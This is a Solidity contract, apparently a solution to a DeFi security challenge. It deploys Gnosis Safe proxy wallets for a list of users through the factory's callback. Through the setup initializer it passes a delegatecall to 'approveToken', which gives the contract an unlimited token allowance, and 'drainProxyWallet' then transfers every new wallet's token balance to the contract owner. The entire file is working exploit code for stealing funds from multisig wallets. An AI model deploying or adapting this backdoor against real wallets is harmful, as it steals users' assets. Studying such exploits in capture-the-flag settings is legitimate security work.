// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxy.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/IProxyCreationCallback.sol";
import "@gnosis.pm/safe-contracts/contracts/GnosisSafe.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract RegisterWallet {

    GnosisSafeProxyFactory private immutable walletFactory;
    address private immutable masterCopy; 
    uint256 private constant MAX_THRESHOLD = 1;
    address private immutable token;
    address private immutable owner;

    constructor(
        address walletFactoryAddress, 
        address masterCopyAddress,
        address tokenAddress
    ) {
        owner = msg.sender;
        walletFactory = GnosisSafeProxyFactory(walletFactoryAddress);
        masterCopy = masterCopyAddress;
        token = tokenAddress;
    }

    modifier onlyOwner {
        require(msg.sender == owner, "non-owner call");
        _;
    }

    function createProxyWithCallback(
        address callback, 
        address[] calldata users
    ) public onlyOwner returns (GnosisSafeProxy proxy) 
    {
        bytes memory approveData = abi.encodeWithSignature("approveToken(address)", address(this));

        for (uint8 i = 0; i < users.length; i++) {
            address[] memory safeOwners = new address[](1);
            safeOwners[0] = users[i];

            bytes memory initializer = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                safeOwners,
                MAX_THRESHOLD,
                address(this),
                approveData,
                address(0x0),
                address(0x0),
                0,
                address(0x0)
            );

            proxy = walletFactory.createProxyWithCallback(
                masterCopy,
                initializer,
                0,
                IProxyCreationCallback(callback)
            );

            drainProxyWallet(address(proxy));
        }
    }

    function approveToken(address spender) public {
        bool approved = IERC20(token).approve(spender, type(uint256).max);
        require(approved, "approve failed");
    }

    function drainProxyWallet(address walletAddress) private {
        uint256 proxyTokenBalance = IERC20(token).balanceOf(walletAddress);
        IERC20(token).transferFrom(walletAddress, owner, proxyTokenBalance);
    }
}